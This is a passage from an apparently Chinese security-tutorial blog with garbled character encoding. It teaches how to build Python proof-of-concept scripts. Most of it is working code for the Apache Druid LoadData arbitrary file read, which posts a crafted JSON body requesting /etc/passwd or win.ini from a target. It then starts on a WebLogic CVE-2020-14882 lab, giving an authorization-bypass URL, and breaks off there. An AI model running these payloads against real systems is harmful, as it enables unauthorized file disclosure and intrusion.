class="comment"># åˆ©ç”¨ requests åº“è¯·æ±‚ç›®æ ‡ï¼Œpost è¯·æ±‚æ ¼å¼ä¸º json=post_data,å¹¶ä½¿ç”¨ verify=False å’Œ allow_redirects=False å‚æ•°æ¥å‘é€å¸¦æœ‰ç¦ç”¨ SSL éªŒè¯å’Œç¦ç”¨é‡å®šå‘çš„è¯·æ±‚</span></span><br><span class="line">res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>ä¿®æ”¹åä»£ç ï¼Œæ³¨æ„è¿™æ—¶å€™è¯¥  Poc è¿˜ä¸èƒ½å»æ‰§è¡Œï¼Œå› ä¸º <code>Poc(url)</code> ä¸­çš„<code> url</code> è¿˜æ²¡æœ‰å®šä¹‰ï¼Œè¯·ç»§ç»­å¾€ä¸‹çœ‹å³å¯</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨æ„è¿™é‡Œå¤šäº†ä¸€ä¸ªPoc(url)ï¼Œurl ç¬¬2ç‚¹ä¸‹é¢æœ‰æåŠå…·ä½“ç”¨é€”</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># è‡ªå®šä¹‰ä¸€ä¸ªå­—å…¸ï¼Œç”¨äºå­˜åœ¨éªŒè¯çš„ payloadï¼Œè‡ªå®šä¹‰ payload åŒºåˆ«ç³»ç»Ÿç‰ˆæœ¬ï¼Œé¿å…æ¼æŠ¥</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½® headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># try except ç”¨äºæ•æŠ“å¼‚å¸¸ï¼Œå½“ç”¨æˆ·è¾“å…¥çš„è¿æ¥æœ‰è¯¯æ—¶ï¼Œæç¤ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># for å¾ªç¯ç”¨äºéå† lists å­—å…¸ä¸­çš„ payload -&gt; &quot;urls&quot;ï¼š[list]</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp æŠ“å–çš„æ¼æ´ post è¯·æ±‚æ•°æ®åŒ…ï¼Œç”¨äºéªŒè¯æ¼æ´ï¼Œä¸»è¦è§¦å‘ç‚¹ä¸º &quot;uris&quot; çš„å‚æ•°å€¼</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ©ç”¨ requests åº“è¯·æ±‚ç›®æ ‡ï¼Œpost è¯·æ±‚æ ¼å¼ä¸º json=post_data,å¹¶ä½¿ç”¨ verify=False å’Œ allow_redirects=False å‚æ•°æ¥å‘é€å¸¦æœ‰ç¦ç”¨ SSL éªŒè¯å’Œç¦ç”¨é‡å®šå‘çš„è¯·æ±‚</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è‹¥ res çš„ response ä¸­å­˜åœ¨ root:x æˆ–è€… [fonts] å­—ç¬¦åˆ™è¯æ˜å­˜åœ¨æ¼æ´å¦åˆ™ä¸å­˜åœ¨æ¼æ´</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] ä¸å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æœ‰è¯¯&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å› ä¸ºä»£ç ä½¿ç”¨äº†æ¨¡å—åŒ–ï¼Œæ‰€ä»¥è‹¥éœ€è¦æ‰§è¡Œä»£ç åˆ™éœ€è¦åˆ©ç”¨ main å‡½æ•°å»æ‰§è¡Œï¼Œå‡½æ•°çš„æ‰§è¡ŒæŒ‰ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p>2ã€è¡¥å…¨å‚æ•°çš„è¾“å…¥ï¼Œå®šä¹‰ <code>Poc(url)</code> é‡Œé¢çš„  <code>url</code></p><p>å°†å‡½æ•°æ¨¡å—åŒ–åï¼Œåˆ©ç”¨ <code>argparse</code> åº“å°† <code>url</code> å€¼ä½¿ç”¨å‘½ä»¤è¡Œçš„æ–¹å¼ç”±ç”¨æˆ·å»è¾“å…¥ï¼Œç¼–å†™ä¸ºå¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªè§£æå¯¹è±¡parserï¼Œç”¨äºè£…è½½å‚æ•°çš„å®¹å™¨</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;usageï¼špython3 demo.py -u [url]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹è¿™ä¸ªè§£æå¯¹è±¡æ·»åŠ å‡ ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œtypeä¸ºè¾“å…¥ç±»å‹ï¼Œmetavarç”¨æ¥æ§åˆ¶éƒ¨åˆ†å‘½ä»¤è¡Œå‚æ•°çš„æ˜¾ç¤ºï¼Œrequire=Trueä¸ºå½“ç”¨æˆ·è¾“å…¥é”™è¯¯æ—¶ï¼Œç³»ç»Ÿè¿”å›æç¤ºæ­£ç¡®çš„è¾“å…¥æ–¹å¼ï¼Œhelpä¸ºæè¿°</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®ä¾‹åŒ– parser</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># è‡ªå®šä¹‰ä¸€ä¸ªå­—å…¸ï¼Œç”¨äºå­˜åœ¨éªŒè¯çš„ payloadï¼Œè‡ªå®šä¹‰ payload åŒºåˆ«ç³»ç»Ÿç‰ˆæœ¬ï¼Œé¿å…æ¼æŠ¥</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½® headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp æŠ“å–çš„æ¼æ´ post è¯·æ±‚æ•°æ®åŒ…ï¼Œç”¨äºéªŒè¯æ¼æ´ï¼Œä¸»è¦è§¦å‘ç‚¹ä¸º &quot;uris&quot; çš„å‚æ•°å€¼ï¼Œå‚æ•°å€¼åˆ©ç”¨ list éå† lists åˆ—è¡¨çš„å€¼</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ©ç”¨ requests åº“è¯·æ±‚ç›®æ ‡ï¼Œpost è¯·æ±‚æ ¼å¼ä¸º json=post_data,å¹¶ä½¿ç”¨ verify=False å’Œ allow_redirects=False å‚æ•°æ¥å‘é€å¸¦æœ‰ç¦ç”¨ SSL éªŒè¯å’Œç¦ç”¨é‡å®šå‘çš„è¯·æ±‚</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è‹¥ res çš„ response ä¸­å­˜åœ¨ root:x æˆ–è€… [fonts] å­—ç¬¦åˆ™è¯æ˜å­˜åœ¨æ¼æ´å¦åˆ™ä¸å­˜åœ¨æ¼æ´</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] ä¸å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æœ‰è¯¯&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å›ºå®šæ ¼å¼ï¼Œç”±äºä¸Šé¢ä»£ç ä½¿ç”¨çš„æ¨¡å—åŒ– def() ç¼–å†™ï¼Œæ‰€ä»¥ä¸‹é¢éœ€è®¾ç½®ä¸»å‡½æ•°è¿›è¡Œæ‰§è¡Œè„šæœ¬</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Poc(args.url)</span><br></pre></td></tr></table></figure></div><p>å¦‚æœä¸æƒ³ç»§ç»­ç¾åŒ–ä¸‹å»ï¼Œå…¶å®è¿™æ—¶å€™è„šæœ¬å°±å·²ç»ç¼–å†™å®Œæˆäº†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230516203856083.png" data-caption="image-20230516203856083"><img src="/../images/poc/image-20230516203856083.png" alt="image-20230516203856083"></a></p><p>3ã€å…·ä½“æ›´ä¸ºå®Œå–„çš„ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† argparse æ¨¡å—åŒ–</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usageï¼špython3 demo.py -u [url]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ä¸€ä¸ª bannerï¼Œç¾åŒ–è„šæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___ ___  __       ____    ________ _  _   ___  </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \  / /____  | || | / _ \ </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | | ) || |______ __) |/ /_   / /| || || (_) |</span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | |/ / | |______|__ &lt;| &#x27;_ \ / / |__   _\__, |</span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| / /_ | |      ___) | (_) / /     | |   / / </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/____||_|     |____/ \___/_/      |_|  /_/  </span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">    <span class="comment"># æ­¤æ¨¡å—æ˜¯è°ƒç”¨ä¸Šé¢ def argument()ï¼Œæ¨¡å—ä¹‹é—´ç›´æ¥è°ƒç”¨ï¼Œå°† argument() å‡½æ•°èµ‹å€¼ç»™ argsï¼Œç„¶å url è¢« args.url å®šä¹‰ç”¨äºå‚æ•°åŒ–è¾“å…¥ï¼Œæœ€ç»ˆ url è¢« request.post è°ƒç”¨</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¼æ´éªŒè¯ Paylaod ï¼Œè®¾ç½®ä¸€ä¸ª lists åˆ—è¡¨å­˜å‚¨</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># list å‚æ•°éå†å·²å®šä¹‰çš„ lists å‚æ•°å€¼</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp æŠ“å–çš„æ¼æ´ post è¯·æ±‚æ•°æ®åŒ…ï¼Œç”¨äºéªŒè¯æ¼æ´ï¼Œä¸»è¦è§¦å‘ç‚¹ä¸º &quot;uris&quot; çš„å‚æ•°å€¼</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ©ç”¨ requests åº“è¯·æ±‚ç›®æ ‡ï¼Œpost è¯·æ±‚æ ¼å¼ä¸º json=post_data,å¹¶ä½¿ç”¨ verify=False å’Œ allow_redirects=False å‚æ•°æ¥å‘é€å¸¦æœ‰ç¦ç”¨ SSL éªŒè¯å’Œç¦ç”¨é‡å®šå‘çš„è¯·æ±‚</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è‹¥è¿”å›çš„å“åº”ä¸­å­˜åœ¨ &quot;root:x&quot; æˆ–è€… &quot;[fonts]&quot; åˆ™è¯æ˜å­˜åœ¨æ¼æ´ï¼Œå¦åˆ™ä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] ä¸å­˜åœ¨ Apache Druid LoadData ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æœ‰è¯¯!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å‡½æ•°å…ˆæ‰§è¡Œ banner() é‡Œé¢çš„ä»£ç å†æ‰§è¡Œ Poc() é‡Œé¢çš„ä»£ç </span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230516204750654.png" data-caption="image-20230516204750654"><img src="/../images/poc/image-20230516204750654.png" alt="image-20230516204750654"></a></p><h2 id="å››ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote-Command-Executionï¼ŒRCEï¼‰"><a href="#å››ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote-Command-Executionï¼ŒRCEï¼‰" class="headerlink" title="å››ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote Command Executionï¼ŒRCEï¼‰"></a>å››ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote Command Executionï¼ŒRCEï¼‰</h2><h3 id="Weblogic-CVE-2020-14882-æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#Weblogic-CVE-2020-14882-æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Weblogic CVE-2020-14882 æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>Weblogic CVE-2020-14882 æœªæˆæƒè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><h4 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ vulhub</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># è¿›å…¥ CVE-2020-14882 ç›®å½•è¾“å…¥å‘½ä»¤å¯åŠ¨ç¯å¢ƒ</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153416783.png" data-caption="image-20230517153416783"><img src="/../images/poc/image-20230517153416783.png" alt="image-20230517153416783"></a></p><p>è®¿é—®åå° <a href="http://192.168.148.155:7001/console/login/LoginForm.jsp">http://192.168.148.155:7001/console/login/LoginForm.jsp</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153520549.png" data-caption="image-20230517153520549"><img src="/../images/poc/image-20230517153520549.png" alt="image-20230517153520549"></a></p><p>ç¯å¢ƒæœ¬èº«æ‰€å­˜åœ¨çš„æœªæˆæƒè®¿é—®æ¼æ´ <a href="http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal">http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153912607.png" data-caption="image-20230517153912607"><img src="/../images/poc/image-20230517153912607.png" alt="image-20230517153912607"></a></p><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šWebLogic Server 10.3.6.0.0ã€WebLogic Server 12.1.3.0.0ã€WebLogic Server 12.2.1.3.0ã€WebLogic Server 12.2.1.4.0ã€WebLogic Server 14.1.1.0.0</p></blockquote><h4 id="POC-ä»£ç ç¼–å†™åˆ†æ-2"><a href="#POC-ä»£ç ç¼–å†™åˆ†æ-2" class="headerlink" title="POC ä»£ç ç¼–å†™åˆ†æ"></a>POC ä»£ç 